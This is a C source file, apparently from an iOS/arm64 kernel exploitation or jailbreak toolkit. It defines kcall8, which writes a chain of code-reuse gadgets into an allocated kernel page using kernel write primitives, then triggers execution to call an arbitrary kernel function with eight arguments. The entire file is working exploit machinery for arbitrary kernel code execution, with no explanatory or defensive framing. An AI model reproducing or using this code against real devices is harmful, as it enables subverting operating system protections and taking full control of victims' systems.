#include "offsets.h"
#include "krw.h"
#include "kexecute.h"

#define BLK1   0x000 
#define BLK2   0x100
#define BLK3   0x180
#define BLK4   0x200
#define BLK5   0x280
#define BLK6   0x300
#define BLK7   0x380
#define BLK8   0x400
#define BLK9   0x480 
#define STORED_RET_OFF 0x500
uint64_t kcall8(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t kpage = kalloc(0x1000);

    kwrite64(kpage,         kpage);
    kwrite64(kpage + 0x98,  kpage);
    kwrite64(kpage + 0x7C0, kgad(KGADGET_POPULATE));

    kwrite64(kpage + BLK1 + 0x10, kgad(KGADGET_MOV_X12_X0__BR_X2));
    kwrite64(kpage + BLK1 + 0x18, kgad(KGADGET_POPULATE));
    kwrite64(kpage + BLK1 + 0x28, kgad(KGADGET_MOV_X0_X3__BR_X4));
    kwrite64(kpage + BLK1 + 0x30, kpage + BLK2);
    kwrite64(kpage + BLK1 + 0x38, kgad(KGADGET_POPULATE));

    kwrite64(kpage + BLK2 + 0x10, kgad(KGADGET_MOV_X15_X2__BR_X3));
    kwrite64(kpage + BLK2 + 0x18, kpage + BLK3);
    kwrite64(kpage + BLK2 + 0x28, x0);
    kwrite64(kpage + BLK2 + 0x30, kgad(KGADGET_POPULATE));

    kwrite64(kpage + BLK3 + 0x10, kgad(KGADGET_MOV_X20_X15__BR_X12));
    kwrite64(kpage + BLK3 + 0x18, kpage + BLK4);

    kwrite64(kpage + BLK4 + 0x10, kgad(KGADGET_MOV_X11_X1__BR_X12));
    kwrite64(kpage + BLK4 + 0x18, kpage + BLK5);
    kwrite64(kpage + BLK4 + 0x20, addr);

    kwrite64(kpage + BLK5 + 0x10, kgad(KGADGET_MOV_X16_X1__BR_X2));
    kwrite64(kpage + BLK5 + 0x18, kpage + BLK6);
    kwrite64(kpage + BLK5 + 0x20, x7);
    kwrite64(kpage + BLK5 + 0x28, kgad(KGADGET_POPULATE));

    kwrite64(kpage + BLK6 + 0x10, kgad(KGADGET_MOV_X10_X12__BR_X8));
    kwrite64(kpage + BLK6 + 0x18, kgad(KGADGET_MOV_X0_X1__BR_X2));
    kwrite64(kpage + BLK6 + 0x20, kpage + BLK7);
    kwrite64(kpage + BLK6 + 0x28, kgad(KGADGET_POPULATE));

    kwrite64(kpage + BLK7 + 0x10, kgad(KGADGET_MOV_X7_X16__BR_X10));
    kwrite64(kpage + BLK7 + 0x18, kpage + BLK8);

    kwrite64(kpage + BLK8 + 0x10, kgad(KGADGET_MOV_X10_X0__BR_X2));
    kwrite64(kpage + BLK8 + 0x18, kgad(KGADGET_MOV_X0_X20__BR_X11));
    kwrite64(kpage + BLK8 + 0x28, kgad(KGADGET_MOV_X0_X3__BR_X4));
    kwrite64(kpage + BLK8 + 0x30, kpage + BLK9);
    kwrite64(kpage + BLK8 + 0x38, kgad(KGADGET_POPULATE));

    kwrite64(kpage + BLK9 + 0x10, kgad(KGADGET_MOV_X5_X8__BR_X10));
    kwrite64(kpage + BLK9 + 0x18, x5);
    kwrite64(kpage + BLK9 + 0x20, x1);
    kwrite64(kpage + BLK9 + 0x28, x2);
    kwrite64(kpage + BLK9 + 0x30, x3);
    kwrite64(kpage + BLK9 + 0x38, x4);
    uint64_t STORED_RET = kpage + STORED_RET_OFF;

    kexecute(kgad(KGADGET_PROLOGUE), kpage, STORED_RET, 0, 0, 0, 0, x6);

    uint64_t kret =  kread64(STORED_RET);
    kfree(kpage, 0x1000);
    return kret;
}